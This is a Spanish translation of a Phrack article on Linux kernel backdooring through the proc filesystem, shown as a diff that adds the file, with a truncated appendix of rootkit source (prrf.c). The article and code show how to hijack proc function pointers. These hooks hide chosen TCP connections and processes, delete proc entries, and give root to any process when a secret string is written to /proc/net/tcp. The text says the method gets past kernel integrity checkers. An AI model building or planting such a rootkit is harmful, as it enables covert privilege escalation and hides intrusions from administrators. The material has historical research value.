@@ -1,0 +1,1097 @@
+
+                             ==Phrack Inc.==
+
+             Volumen 0x0b, Numero 0x3a, Archivo #0x06 de 0x0e
+
+|=------=[ Sub proc_root Quando Sumus (Avances en Kernel Hacking) ]=-----=|
+|=-----------------------------------------------------------------------=|
+|=-----------------=[ palmers <palmers@team-teso.net> ]=-----------------=|
+
+--[ Contenidos
+
+  1 - Introduccion
+
+  2 - VFS y Proc Primer
+    2.1 - VFS y por que Proc?
+    2.2 - proc_fs.h
+    2.3 - El proc_root
+
+  3 - Adonde Ir?
+    3.1 - Asegurando?
+    3.2 - Denial of Service
+    3.3 - Ocultamiento de Se~al
+    3.4 - Elevacion de Privilegios
+    3.5 - Ocultamiento de Proceso
+    3.6 - Otras aplicaciones
+
+  4 - Conclusion
+
+  5 - Referencia
+
+  Apendice A: prrf.c
+
+
+
+--[ 1 - Introduccion
+
+  "The nineteenth century dislike of romanticism is the rage of Caliban
+seeing his own face in the glass.
+The nineteenth century dislike of realism is the rage of Caliban not seeing
+his own face in the glass."
+		- Oscar Wilde, the preface to "The picture of Dorian Gray"
+
+  Ya que aqui me preocupo por hacking, y no literatura, vamos a formalizarlo.
+Nuestro romanticismo es seguridad, realismo es su sombra. Este articulo es
+acerca del hacker Caliban. Nuestro lente puede ser el kernel de Linux.
+
+  No el kenel entero; especialmente el sistema de archivos proc. Ofrece
+interesantes caracteristicas y son muy usadas en userland.
+
+  Describire estas tecnicas para su uso en Linux kernel modules (LKM). Esta
+en el usuario el portar estas tecnicas. Aunque, las tecnicas son portables,
+su uso esta muy limitado en otros unices. El sistema de archivos proc,
+desarrollado extendido como en Linux, no esta tan extendido en otros unices.
+En general, lista un directorio por proceso. En linux puede ser usado para
+reunir abudante informacion. Muchos programas cuentan con el. Mas informacion
+puede ser encontrada en [7] y [8].
+
+  Las antiguas versiones de UNIX y HP-UX no proveen el Procesamiento de datos 
+del sistema de archivos proc, como el obtenido por el comando ps(1), es
+obtenido leyendo la memoria del kernel directamente. Esto requiere permisos
+de superusuario y es incluso menos portable que la estructura del sistema de
+archivos proc.
+
+
+--[ 2 - VFS y Proc Primer
+
+  Primero detallare las necesidades basicas para entender las tecnicas
+explicadas despues aqui. El dise~o del sistema de archivos proc sera
+investigado, finalmente nadaremos dentro, bueno, el tope del techo.
+
+
+--[ 2.1 - VFS y por que Proc?
+
+  El kernel provee una capa de abstraccion de sistema de archivos, llamada
+virtual filesystem o VFS (sistema de archivos virtual). Es usado para proveer
+una vista unificada en cualquier sistema de archivos desde la userland
+(lee [1] para detalles). Mas sobre esta metodologia puede ser encontrado en
+[2].
+
+  No nos fijaremos en proc desde la vista de VFS. Miraremos el sistema de
+archivos no-unificado que es en el nivel de implementacion del sistema de
+archivos proc. Esto tiene una simple razon. Queremos aplicar cambios a proc
+y que se siga viendo como cualquier otro tipo de sistema de archivos.
+
+  Ya mencione por que proc es el objetivo de este articulo? tiene dos
+atributos que lo hacen interesante:
+
+	1. es un sistema de archivos.
+	2. reside completamente en la memoria del kernel.
+
+  Ya que es un sistema de archivos accesible totalmente desde la userland
+esta limitado a la funcionalidad de la capa VFS provista por el kernel,
+a saber leer, escribir, abrir y parecerse a las system calls (ademas de
+otros metodos de acceso, lee [3]),
+
+  Elaborare la pregunta. Como el kernel puede ser backdooreado sin cambiar
+las system calls (llamadas al sistema)?.
+
+
+--[ 2.2 - proc_fs.h
+
+  Este subcapitulo se preocupara en el archivo llamado proc_fs.h;
+comunmente en ~/include/linux/, donde ~ es el root de tu arbol de codigo
+del kernel. Ok, aqui vamos para las series 2.2:
+
+/*
+ * Esto no es completamente implementado todavia. La idea es
+ * crear un arbol en memoria (como el actual arbol de sistema de archivos
+ * /proc) de las proc_dir_entries, por lo que podemos
+ * agregar nuevas lineas a /proc dinamicamente.
+ *
+ * El puntero "next" crea una lista linkeada de un directorio /proc,
+ * mientras parent/subdir crea la estructura de directorio (todo
+ * archivo /proc tiene un parent, pero "subdir" es NULL para todas las
+ * entradas no-directorio).
+ *
+ * "get_info" es llamado en "read", mientras "fill_inode" es usado para
+ * llenar el archivo tipo/proteccion/due~o con informacion especifica a un
+ * archivo particular /proc.
+ */
+struct proc_dir_entry {
+	unsigned short low_ino;
+	unsigned short namelen;
+	const char *name;
+	mode_t mode;
+	nlink_t nlink;
+	uid_t uid;
+	gid_t gid;
+	unsigned long size;
+	struct inode_operations * ops;
+	int (*get_info)(char *, char **, off_t, int, int);
+	void (*fill_inode)(struct inode *, int);
+	struct proc_dir_entry *next, *parent, *subdir;
+	void *data;
+	int (*read_proc)(char *page, char **start, off_t off,
+			int count, int *eof, void *data);
+	int (*write_proc)(struct file *file, const char *buffer,
+		unsigned long count, void *data);
+	int (*readlink_proc)(struct proc_dir_entry *de, char *page);
+        unsigned int count;     /* usar count */
+        int deleted;            /* borrar flag */
+};
+
+  El "arbol en memoria" sera unificado por la VFS. Esta
+estructura es un poco diferente en el kernel 2.4:
+
+/*
+ * Esto no es completamente implementado todavia. La idea es
+ * crear un arbol en memoria (como el actual arbol de sistema de archivos /proc
+ * de las proc_dir_entries, por lo que podemos
+ * agregar nuevas lineas a /proc dinamicamente.
+ *
+ * El puntero "next" crea una lista linkeada de un directorio /proc,
+ * mientras parent/subdir crea la estructura de directorio (todo
+ * archivo /proc tiene un parent, pero "subdir" es NULL para todas las
+ * entradas no-directorio).
+ *
+ * "get_info" es llamado en "read", mientras "owner" es usado para proteger al
+ * modulo de descargar mientras proc_dir_entry esta en uso
+ */
+
+typedef int (read_proc_t)(char *page, char **start, off_t off,
+			int count, int *eof, void *data);
+typedef int (write_proc_t)(struct file *file, const char *buffer,
+			unsigned long count, void *data);
+typedef int (get_info_t)(char *, char **, off_t, int);
+
+struct proc_dir_entry {
+	unsigned short low_ino;
+	unsigned short namelen;
+	const char *name;
+	mode_t mode;
+	nlink_t nlink;
+	uid_t uid;
+	gid_t gid;
+	unsigned long size;
+	struct inode_operations * proc_iops;
+	struct file_operations * proc_fops;
+	get_info_t *get_info;
+	struct module *owner;
+	struct proc_dir_entry *next, *parent, *subdir;
+	void *data;
+	read_proc_t *read_proc;
+	write_proc_t *write_proc;
+	atomic_t count;		/* usar count */
+	int deleted;		/* borrar flag */
+	kdev_t  rdev;
+};
+
+  A~os de desarrollo no lo completaron. Err.. completaron, todavia.
+Pero bastante bien, cambio. El prototipo de funcion get_info perdio
+un argumento. Trabajando alrededor de esto hace al codigo portable
+un poco desordenado.
+
+  Nota que hay tres nuevas entradas mientras una entrada, 
+readlink_proc, fue sacada. Nota tambien, la estructura de operacion
+de archivo fue movida desde las operaciones inode a la estructura
+proc_dir_entry. Trabajando alrededor de esto es mejor, lee seccion 3.
+
+
+--[ 2.3 - El proc_root
+
+  El kernel de Linux exporta el root inode del sistema de archivos proc,
+llamado proc_root. Asi pues, es el root inode del sistema de archivos
+proc que el mountpoint (punto de montaje)., comunmente /proc, lo esta
+refiriendo. Podemos, empezando ahi, ir a cualquier archivo bajo ese
+directorio. Sin embargo, hay una excepcion. Los directorios de los
+procesos nunca pueden ser alcanzados desde proc_root. Son agregados
+dinamicamente y presentados a la capa del VFS si readdir (operacion
+inode) es llamada.
+
+  Debe quedar claro que proc_root es de tipo "struct proc_dir_entry".
+  
+  
+-[ 3. - Adonde Ir?
+
+  Este capitulo introducira tecnicas para adquirir aun mas habilidades
+que las obtenidas comunmente por sustitucion de systemcall.
+
+  Las siguientes funciones y macros seran usadas en el codigo provisto
+en estas subsecciones (nota: para implementaciones lee apendice A):
+
+	Como fue notado en la seccion 2.2 tenemos que cuidarnos de un
+	peque~o cambio en el dise~o:
+
+	#if defined (KERNEL_22)
+	#define FILE_OPS        ops->default_file_ops
+	#define INODE_OPS       ops
+	#elif defined (KERNEL_24)
+	#define FILE_OPS        proc_fops
+	#define INODE_OPS       proc_iops
+	#endif
+
+	struct proc_dir_entry *
+	traverse_proc (char *path, struct proc_dir_entry *start):
+	  Si tiene exito, devuelve un puntero al archivo proc
+	especificado por path. Si falla, NULL es devuelto.
+	Start puede ser tanto NULL o una proc_dir_entry arbitraria;
+	marca el punto donde la busqueda comienza.
+	El path puede empezar con "~/". Si empieza asi, la busqueda
+	empieza en proc_root.
+	
+	int
+	delete_proc_file (char *path):
+	  Esta funcion borrara un archivo de la lista de directorios
+	proc. No liberara la memoria ocupada por proc_dir_entry,
+	haciendole posible de esta manera reintrocucirlo despues.
+	
+
+--[ 3.1 - Asegurando?
+
+  Las modificaciones mas faciles que vienen a la mente estan relacionadas
+a los primeros pocos campos en la proc_dir_entry. A saber uid, gid y mode.
+Cambiandolos podemos simplemente re-producir y/o rechazar la habilidad
+para ciertos usuarios para acceder a cierta informacion. Nota aparte aqui:
+alguna informacion accesible via /proc puede ser obtenida de otras formas.
+
+  Una implementacion puede verse asi:
+
+	proc_dir_entry *a = NULL;
+	a = traverse_proc ("~/ksyms", NULL);
+	if (a) {
+		/* resetea permisos a 400 (r--------): */
+		a->mode -= (S_IROTH | S_IRGRP);
+	}
+	a = traverse_proc ("~/net", NULL);
+	if (a) {
+		/* resetea permisos a 750 (rwxr-x---): */
+		a->mode = S_IRWXU | S_IRGRP | S_IXGRP;
+		/* resetea el grupo due~o a una id especial de admin de grupo */
+		a->gid = 7350;
+	}
+
+  Otra posibilidad para asegurar el acceso a proc es dada en 3.5.
+  
+  
+--[ 3.2 - Denial Of Service (Denegacion de Servicio)
+
+  Bueno, hare esto lo mas breve posible. Un usuario malicioso podria
+aplicar cambios a archivos para hacer utiles partes del sistema.
+Esos, mencionados arriba, pueden ser des-hechos. Pero si el usuario
+mailicoso simplemente des-linkea un archivo, ese esta perdido:
+
+	/* oops, nos olvidamos de guardar el puntero ... */
+	delete_proc_file ("~/apm");
+
+  lo que realmente pasa en llamadas delete_proc_files (simplificado):
+        0. buscar la proc_dir_entry del archivo a borrar (to_del)
+	1. buscar la proc_dir_entry que coincida:
+	   proc->next->name == to_del->name
+	2. relink:
+	   proc->next = to_del->next
+
+
+--[ 3.3 - Ocultamiento de Conexion
+
+  La utilidad netstat usa archivos del archivo ~/net/* de proc para mostrar
+p.e. conexiones tcp y su estado, escuchar sockets udp etc. Lee [4] para
+una completa discusion de netstat. Ya que controlamos el sistema de
+archivos proc podemos definir que se lee y que no. La estructura
+porc_dir_entry contiene un puntero de funcion llamado get_info que es
+llamado en la lectura del archivo. Redireccionando esto podemos tomar
+control de los contenidos de archivos en /proc.
+
+  Ten cuidado del formato de archivo en versiones diferentes. Los
+archivos mencionados arriba cambiaron su formato de 2.2.x a 2.4.x.
+Notablemente, la misma funcion puede ser usada para redireccion.
+Veamos como se desarrolla en kernels 2.5.x.
+
+  un ejemplo (para kernels 2.2.x, para diferencias al kernel 2.4.x
+lee la seccion 2.2):
+
+	/* guardamos el get_info original */
+	int (*saved_get_info)(char *, char **, off_t, int, int);
+	proc_dir_entry *a = NULL;
+
+	/* el nuevo get_info ... */
+	int
+	new_get_info (char *a, char **b, off_t c, int d, int e) {
+		int x = 0;
+		x = saved_get_info (a, b, c, d, e);
+		/* hace algo aqui ... */
+		return x;
+	}
+
+	a = traverse_proc ("~/net/tcp", NULL);
+	if (a) {
+		/*
+		 * solamente setteamos el puntero get_info para que apunte a
+		 * nuestra nueva funcion. Para deshacer estos cambios 
+		 * simplemente restauramos el puntero.
+		 */
+		saved_get_info = a->get_info;
+		a->get_info = &new_get_info;
+	}
+
+  El Apendice A ofrece un ejemplo de implementacion.
+  
+  
+--[ 3.4 Elevacion de Privilegios
+
+  A menudo una system call es utilizada para dar privilegios extra a un
+usuario bajo ciertas condiciones. No redireccionaremos una system call para
+esto. Redireccionando la operacion de lectura de archivo de un archivo es
+suficiente asi pues (1) le permite a un usuario enviar datos dentro del kernel y (2) es
+considerablemente cauteloso si elegimos el dise~o correcto o el archivo
+correcto (elevando la id de una tarea a 0 si escribe un '1' a
+/proc/sys/net/ipv4/ip_forward es ciertamente una mala idea).
+
+  Un poco de codigo explicara esto.
+
+	a = traverse_proc ("~/ide/drivers", NULL);
+	if (a) {
+		/*
+		 * la funcion de escritura es llamada si el archivo es
+		 * escrito a.
+		 */
+		a->FILE_OPS->write = &new_write;
+	}
+
+  Es una buena idea guardar el puntero que sobreescribiste. Si borras el
+modulo de memoria conteniendo la funcion podria liberarse. Puede causar
+estragos a un sistema si llama subsecuentemente a un puntero NULL. El
+lector curioso tiene encargado leer el apendice A.
+
+
+--[ 3.5 - Ocultamiento de Proceso
+
+  Que pasa si un directorio esta por ser leido? Tienes que encontrar su
+inode, despues lees sus entradas usando readdir. VFS ofrece una interface
+unificada para esto, no nos interesa y reseteamos el puntero a readdir del
+inode padre en cuestion.
+
+  Ya que los directorios del proceso estan directamente bajo proc_root no
+hay necesidad de buscar el inode padre. Nota que no escondemos las entradas
+desde el usuario clasificandolas, pero no escribiendolas a la memoria del
+usuario.
+
+
+	/* un puntero a la funcion original filldir */
+	filldir_t real_filldir;
+
+	static int new_filldir_root (void * __buf, const char * name,
+			int namlen, off_t offset, ino_t ino) {
+		/*
+		 * es la entrada del directorio, que podria ser agregada
+		 * tiene un nombre estupido
+		 * indica una suma exitosa y no hace nada.
+		 */
+		if (isHidden (name))
+			return 0;
+		return real_filldir (__buf, name, namlen, offset, ino);
+	}
+
+
+	/* readdir, negocios como es usual. */
+	int new_readdir_root (struct file *a, void *b, filldir_t c) {
+		/*
+		 * Nota: no hay necesidad de settear el puntero cada vez
+		 * que new_readdir_root es llamado. Pero tenemos que settearlo
+		 * una vez, cuando reemplazamos la funcion readdir. Si sabemos
+		 * donde miente filldir a esta altura esto deberia ser
+		 * cambiado. (si, filldir es estatica).
+		 */
+		real_filldir = c;
+		return old_readdir_root (a, b, new_filldir_root);
+	}
+
+
+	/* reemplazar la operacion de archivo readdir. */
+	proc_root.FILE_OPS->readdir = new_readdir_root;
+
+  Si el proceso debe ser agregado a lo ultimo la lista de entradas es
+escondida si no es propiamente linkeado ya que a nuestra filldir no le
+importa linkear. Sin embargo, esto es muy poco probable que pase. El
+usuario tiene todo el poder que necesita para evitar esta condicion.
+
+  Es posible tan solo hacer archivos inaccsesibles en /proc reemplazando
+la operacion lookup inode del padre:
+ operacion inode del parent:
+
+	struct dentry *new_lookup_root (struct inode *a, struct dentry *b) {
+		/*
+		 * resultara en:
+		 * "/bin/ls: /proc/<d_iname>: No such file or directory"
+		 */
+		if (isHidden (b->d_iname))
+			return NULL;
+		return old_lookup_root (a, b);
+	}
+
+	/* ... activa la caracteristica ... */
+	proc_root.INODE_OPS->lookup = &new_lookup_root;
+
+  Ej. esto puede ser usado para establecer reglas de acceso bien hechas.
+
+
+--[ 3.6 - Otras Aplicaciones
+
+  Ahora, echemos una mirada a que archivos esperan ser modificados. En
+el directorio /proc/net hay ip_fwnames (definiendo nombres de cadena) y
+ip_fwchains (reglas). Son leidas por ipchains (no por iptables) si son
+solicitadas para listar las reglas de filtro. Como se menciono arriba,
+hay un archivo llamado tcp, escuchando todos los sockets tcp existentes.
+Como uno para udp, tambien. El archivo raw lista los sockets raw.
+Sockstat contiene estadisticas en el uso del socket. Un backdoor
+cuidadosamente escrito tiene que sincronizar entre los (tcp|udp|...)
+archivos y este. La utilidad arp usa /proc/net/arp para reunir
+informacion. Route usa el archivo /proc/net/route. Lee sus paginas man
+y busca las secciones llamadas "ARCHIVOS" y "VER TAMBIEN". Sin embargo,
+chequear los archivos es solo la mitad del trabajo, p.e. ifconfig usa
+un archivo proc (dev) mas ioctl's para obtener su informacion.
+
+  Como puedes ver, hay muchas muchas aplicaciones a estas tecnicas.
+Esta a tu alcance el escribir nuevas funciones get_info para filtrar
+su output o agregar nuevas entradas malvadas (problemas no existentes
+son los mas dificiles de debuggear)
+
+
+--[ 4 - Conclusion
+
+  Como vimos en la seccion 3.2 - 3.6 hay muchas posibilidades de
+debilitar la seguridad en el kernel de Linux. Los mecanismos de proteccion
+del kernel existentes, como [5] y [6] no los evitaran; chequean solo por
+el bien conocido, basado en system call, backdooring; nosotros trabajamos
+completamente alrededor de el. Desabilitando el soporte LKM solo evitara
+la implimentacion especifica incluida aqui para funcionar (porque es un
+LKM).
+
+  Cambiando las estructuras proc accediendo a /dev[k]mem es facil ya que
+la mayoria de los datos de los inodes son estaticos. Por lo tanto les puede
+ser posible encontrar por coincidencia simple de dise~o (solo los punteros
+de funcion y punteros next/parent/subdir seran diferentes).
+
+  Una meta importante, esconderse de cualquier directorio y archivo, no fue
+lograda. Esto no implica que no pueda ser alcanzado por juegos de proc.
+Una posibilidad puede ser hardcodear los binarios necesitados dentro de las
+imagenes de las estructuras proc del kernel, o en sistemas usando sdram,
+dejandoles ocupar espacio de memoria sin usar. Efectivamente otra posibilidad
+podria ser atacar el layer (capa) VFS. Eso, por supuesto, es la historia de
+otro articulo.
+
+  Finalmente algunas palabras acerca de la implementacion apendizada.
+Recomiendo seria y urgentemente la lectura sobre como usarlo SOLO como un
+concepto de prueba. El autor puede y no sera responsable por ningun,
+incluyendo pero no limitado a, incidental o consecuencial da~o, perdida de
+datos o baja de servicio. El codigo es provisto "COMO ES" y SIN NINGUNA
+GARANTIA. USALO BAJO TU PROPIO RIESGO. El codigo compila y corre en kernels
+2.2.x y 2.4.x.
+
+
+--[ 5 - Referencia
+
+[1] "Overview of the Virtual File System", Richard Gooch <rgooch@atnf.csiro.au>
+    http://www.atnf.csiro.au/~rgooch/linux/docs/vfs.txt
+[2] "Operating Systems, Design and Implementation", by Andrew S. Tanenbaum and
+    Albert S. Woodhull
+    ISBN 0-13-630195-9
+[3] RUNTIME KERNEL KMEM PATCHING, Silvio Cesare <silvio@big.net.au>
+    http://www.big.net.au/~silvio/runtime-kernel-kmem-patching.txt
+[4] netstat
+    lee netstat(1) para mas informacion.
+[5] StMichael, by Tim Lawless <lawless@netdoor.com>
+    http://sourceforge.net/projects/stjude
+[6] KSTAT, by FuSyS <fusys@s0ftpj.org>
+    http://s0ftpj.org/tools/kstat.tgz
+[7] proc pseudo-filesystem man page
+    see proc(5)
+[8] "T H E  /proc   F I L E S Y S T E M", Terrehon Bowden <terrehon@pacbell.net>,
+    Bodo Bauer <bb@ricochet.net> and Jorge Nerin <comandante@zaralinux.com>
+    ~/Documentation/filesystems/proc.txt (only in recent kernel source trees!)
+    http://skaro.nightcrawler.com/~bb/Docs/Proc
+
+
+--[ Apendice A: prrf.c
+
+<++> ./prrf.c
+/*
+ * prrf.c
+ *
+ * LICENSE:
+ * this file may be copied or duplicated in any form, in
+ * whole or in part, modified or not, as long as this
+ * copyright notice is prepended UNMODIFIED.
+ *
+ * This code is proof of concept. The author can and must
+ * not be made responsible for any, including but not limited
+ * to, incidental or consequential damage, data loss or
+ * service outage. The code is provided "AS IS" and WITHOUT
+ * ANY WARRENTY. USE IT AT YOU OWN RISK.
+ *
+ * palmers / teso - 12/02/2001
+ */
+
+/*
+ * NOTE: la redireccion get_info NO maneja buffers peque~os..
+ *       tu sistema _podra_ oops o incluso quebrara si lees menos
+ *       bytes que los que el archivo contiene!
+ */
+
+/*
+ * 2.2.x #define KERNEL_22
+ * 2.4.x #define KERNEL_24
+ */
+#define KERNEL_22	1
+#define DEBUG		1
+
+#define __KERNEL__
+#define MODULE
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <sys/syscall.h>
+#include <linux/config.h>
+#include <linux/types.h>
+#include <linux/slab.h>
+#include <linux/smp_lock.h>
+#include <linux/fd.h>
+#include <linux/fs.h>
+#include <linux/proc_fs.h>
+#include <linux/sched.h>
+#include <asm/uaccess.h>
+
+
+/*
+ * preocupate por el dise~o de proc_dir_entry
+ */
+#if defined (KERNEL_22)
+  #define FILE_OPS	ops->default_file_ops
+  #define INODE_OPS	ops
+#elif defined (KERNEL_24)
+  #define FILE_OPS	proc_fops
+  #define INODE_OPS	proc_iops
+#endif
+
+#define BUF_SIZE	65535
+#define AUTH_STRING	"ljdu3g9edaoih"
+
+
+struct hide_proc_net
+{
+  int			id;		/* entrada id, util ;) */
+  char			*local_addr,	/* esto deberia ser */
+			*remote_addr,   /* auto-explicativo ... */
+  			*local_port,
+			*remote_port;
+};
+
+/*
+ * global lst_entry:
+ * setteada por traverse_proc, usada por delete_proc_file.
+ */
+struct proc_dir_entry	*lst_entry = NULL;
+
+/*
+ * algunos punteros de funcion para guardar funciones originales.
+ */
+#if defined (KERNEL_22)
+  int (*old_get_info_tcp) (char *, char **, off_t, int, int);
+#elif defined (KERNEL_24)
+  get_info_t *old_get_info_tcp;
+#endif
+
+ssize_t (*old_write_tcp) (struct file *, const char *, size_t, loff_t *);
+struct dentry * (*old_lookup_root) (struct inode *, struct dentry *);
+int (*old_readdir_root) (struct file *, void *, filldir_t);
+filldir_t real_filldir;
+
+
+/*
+ * reglas para esconder conexiones
+ */
+struct hide_proc_net hidden_tcp[] = {
+        {0, NULL, NULL, ":4E35", NULL},         /* coincidir conexion desde ANY:ANY a ANY:20021 */
+	{1, NULL, NULL, NULL, ":4E35"},		/* coincidir conexion desde ANY:20021 a ANY:ANY*/
+	{2, NULL, NULL, ":0016", ":4E35"},	/* coincidir conexion desde ANY:20021 a ANY:22 */
+	{7350, NULL, NULL, NULL, NULL}		/* parar entrada, no olvidar de preapendizar este */
+};
+
+
+/*
+ * get_task:
+ * buscar un task_struct por pid.
+ */
+struct task_struct *get_task(pid_t pid)
+{
+	struct task_struct	*p = current;
+
+	do {
+		if (p->pid == pid)
+		return p;
+		p = p->next_task;
+	} while (p != current);
+	return NULL;
+}
+
+
+/*
+ * __atoi:
+ * atoi!
+ */
+int __atoi(char *str)
+{
+	int	res = 0,
+		mul = 1;
+
+	char *ptr;
+	for (ptr = str + strlen(str) - 1; ptr >= str; ptr--) {
+		if (*ptr < '0' || *ptr > '9')
+			return (-1);
+		res += (*ptr - '0') * mul;
+		mul *= 10;
+	}
+	return (res);
+}
+
+
+/*
+ * get_size_off_tcp:
+ * obtener el tama~o del archivo /proc/net/tcp.
+ */
+static off_t get_size_off_tcp (char **start)
+{
+  off_t		x = 0,
+		xx = 0,
+		xxx = 0,
+		y = 0;
+  char		tmp_buf[BUF_SIZE + 1];
+
+  do
+    {
+      x += y;
+      xx += xxx;
+      y = __new_get_info_tcp (tmp_buf, start, x, BUF_SIZE, 0, 1, &xxx);
+    } while (y != 0);
+
+  return x - xx;
+}
+
+
+/*
+ * deny_entry:
+ * chequear parametros de conexion apoyandonos en nuestra lista de control de
+ * acceso para todos los campos no-NULL de una entrada en la que los
+ * parametros dados deben coincidir. De otra forma el socket los mostrara.
+ */
+int deny_entry (char *la, char *lp, char *ra, char *rp)
+{
+  int		x = 0,
+		y,
+		z;
+
+  while (hidden_tcp[x].id != 7350)
+    {
+      y = 0;
+      z = 0;
+
+      if (hidden_tcp[x].local_addr != NULL)
+	{
+	  if (!strncmp (la, hidden_tcp[x].local_addr, 8))
+	    y++;
+	}
+      else
+	z++;
+
+      if (hidden_tcp[x].remote_addr != NULL)
+	{
+	  if (!strncmp (ra, hidden_tcp[x].remote_addr, 8))
+	    y++;
+	}
+      else
+	z++;
+
+      if (hidden_tcp[x].local_port != NULL)
+	{
+	  if (!strncmp (lp, hidden_tcp[x].local_port, 5))
+	    y++;
+	}
+      else
+	z++;
+
+      if (hidden_tcp[x].remote_port != NULL)
+	{
+	  if (!strncmp (rp, hidden_tcp[x].remote_port, 5))
+	    y++;
+	}
+      else
+	z++;
+
+      if ((z != 4) && ((y + z) == 4))
+	return 1;
+      x++;
+    }
+  return 0;
+}
+
+
+/*
+ * __new_get_info_tcp:
+ * filtrara la salida original get_info. primero llamar a la funcion antigua,
+ * luego cortar las lineas no queridas.
+ * XXX: buffers muy peque~os traeran problemas muy grandes.
+ */
+int __new_get_info_tcp (char *page, char **start, off_t pos, int count, int f, int what, off_t *fx)
+{
+  char		tmp_l_addr[8],
+		tmp_l_port[5],
+  		tmp_r_addr[8],
+		tmp_r_port[5],		/* usada para chequeos de acl */
+		*tmp_ptr,
+		*tmp_page;
+  int		x = 0,
+		line_off = 0,
+		length,
+		remove = 0,
+		diff,
+		m;
+
+#if defined (KERNEL_22)
+  x = old_get_info_tcp (page, start, pos, count, f);
+#elif defined (KERNEL_24)
+  x = old_get_info_tcp (page, start, pos, count);
+#endif
+
+  if (page == NULL)
+    return x;
+
+  while (*page)
+    {
+      tmp_ptr = page;
+      length = 28;
+      while (*page != '\n' && *page != '\0')	/* chequear una linea */
+	{
+	/*
+	 * incluso corregimos el campo sl ("line number").
+	 */
+	  if (line_off)
+	    {
+	      diff = line_off;
+
+	      if (diff > 999)
+		{
+	          m = diff / 1000;
+	          page[0] -= m;
+	          diff -= (m * 1000);
+		}
+	      if (diff > 99)
+		{
+	          m = diff / 100;
+	          page[1] -= m;
+	          diff -= (m * 100);
+		}
+	      if (diff > 9)
+		{
+	          m = diff / 10;
+	          page[2] -= m;
+	          diff -= (m * 10);
+		}
+	      if (diff > 0)
+		page[3] -= diff;
+
+	      if (page[0] > '1')
+		page[0] = ' ';
+	      if (page[1] > '1')
+		page[1] = ' ';
+	      if (page[2] > '1')
+		page[2] = ' ';
+	    }
+
+	  page += 6;	/* saltar al principio de la direccion local, XXX: este solucionado? */
+	  memcpy (tmp_l_addr, page, 8);
+
+	  page += 8;	/* saltar al principio del puerto local */
+	  memcpy (tmp_l_port, page, 5);
+
+	  page += 6;	/* saltar a la direccion remota */
+	  memcpy (tmp_r_addr, page, 8);
+
+	  page += 8;	/* saltar al principio del puerto local */
+	  memcpy (tmp_r_port, page, 5);
+
+          while (*page != '\n')	/* saltar al final */
+	    {
+	      page++;
+	      length++;
+	    }
+
+	  remove = deny_entry (tmp_l_addr, tmp_l_port, tmp_r_addr, tmp_r_port);
+	}
+      page++;			/* '\n' */
+      length++;
+
+      if (remove == 1)
+	{
+	  x -= length;
+	  if (what)		/* contar bytes ignorados ? */
+	    *fx += length;
+	  tmp_page = page;
+	  page = tmp_ptr;
+
+	  while (*tmp_page)	/* mover datos hacia atras en pagina */
+	    *tmp_ptr++ = *tmp_page++;
+
+/* ultimando data cero (no necesitada)
+	  while (length--)
+	    *tmp_ptr++ = 0;
+	  *tmp_ptr = 0;
+*/
+	  line_off++;
+	  remove = 0;
+	}
+    }
+  return x;
+}
+
+
+/*
+ * new_get_info_tcp:
+ * necesitamos este envoltorio para evitar la duplicacion de entradas. Tenemos
+ * que chequear para "end of file" de /proc/net/tcp, donde eof miente en
+ * la longitud del archivo - longitud de todas las entradas que borramos.
+ */
+#if defined (KERNEL_22)
+int new_get_info_tcp (char *page, char **start, off_t pos, int count, int f)
+{
+#elif defined (KERNEL_24)
+int new_get_info_tcp (char *page, char **start, off_t pos, int count)
+{
+  int		f = 0;
+#endif
+  int		x = 0;
+  off_t		max = 0;
+ 
+  max = get_size_off_tcp (start);
+  if (pos > max)
+    return 0;
+  x = __new_get_info_tcp (page, start, pos, count, f, 0, NULL);
+
+  return x;
+}
+
+
+/*
+ * new_write_tcp:
+ * una funcion de escritura que hace misc. tareas como elevacion de
+ * privilegios etc.
+ * ej.:
+ * echo AUTH_STRING + nr. > /proc/net/tcp == uid 0 for pid nr.
+ */
+ssize_t new_write_tcp (struct file *a, const char *b, size_t c, loff_t *d)
+{
+  char *tmp = NULL, *tmp_ptr;
+  tmp = kmalloc (c + 1, GFP_KERNEL);
+
+  copy_from_user (tmp, b, c);
+  if (tmp[strlen (tmp) - 1] == '\n')
+    tmp[strlen (tmp) - 1] = 0;
+
+  if (!strncmp (tmp, AUTH_STRING, strlen (AUTH_STRING)))
+    {
+      struct task_struct *x = NULL;
+      tmp_ptr = tmp + strlen (AUTH_STRING) + 1;
+      if ((x = get_task (__atoi (tmp_ptr))) == NULL)
+	{
+	  kfree (tmp);
+	  return c; 
+	}
+      x->uid = x->euid = x->suid = x->fsuid = 0;     
+      x->gid = x->egid = x->sgid = x->fsgid = 0;     
+    }
+
+  kfree (tmp);
+  return c;
+}
+
+
+/*
+ * algunas pruebas ...
+ */
+struct dentry *new_lookup_root (struct inode *a, struct dentry *b)
+{
+  if (b->d_iname[0] == '1')
+    return NULL;	/* resultara en: "/bin/ls: /proc/1*: No such file or directory" */
+  return old_lookup_root (a, b);
+}
+
+
+static int new_filldir_root (void * __buf, const char * name, int namlen, off_t offset, ino_t ino)
+{
+  if (name[0] == '1' && name[1] == '0')	/* hide init */
+    return 0;
+/*
+ * ocultando la ultima tarea (task) en una lista linkeada incorrecta.
+ * esto da ventaja ej. para chocar (ps).
+ */
+  return real_filldir (__buf, name, namlen, offset, ino);
+}
+
+int new_readdir_root (struct file *a, void *b, filldir_t c)
+{
+  real_filldir = c;
+  return old_readdir_root (a, b, new_filldir_root);
+}
+
+
+/*
+ * traverse_proc:
+ * devuelve la entrada de directorio de un archivo dado.la funcion trasversara
+ * sobre la estructura del sistema de archivos hasta que se encuentre el
+ * archivo coincidente. el pr argument puede ser NULL o un punto de comienzo
+ * para la busqueda. path es un string. si comienza con '~' y pr es NULL la
+ * busqueda comienza en proc_root.
+ */
+struct proc_dir_entry *traverse_proc (char *path, struct proc_dir_entry *pr)
+{
+  int			x = 0;
+  char			*tmp = NULL;
+
+  if (path == NULL)
+    return NULL;
+
+  if (path[0] == '~')
+    {
+      lst_entry = &proc_root;
+      return traverse_proc (path + 2, (struct proc_dir_entry *) proc_root.subdir);
+    }
+
+  while (path[x] != '/' && path[x] != 0)
+    x++;
+
+  tmp = kmalloc (x + 1, GFP_KERNEL);
+  memset (tmp, 0, x + 1);
+  memcpy (tmp, path, x);
+
+  while (strcmp (tmp, (char *) pr->name))
+    {
+      if (pr->subdir != NULL && path[x] == '/')
+        {
+          if (!strcmp (tmp, (char *) pr->subdir->name))
+	    {
+	      kfree (tmp);
+	      lst_entry = pr;
+	      return traverse_proc (path + x + 1, pr->subdir);
+	    }
+        }
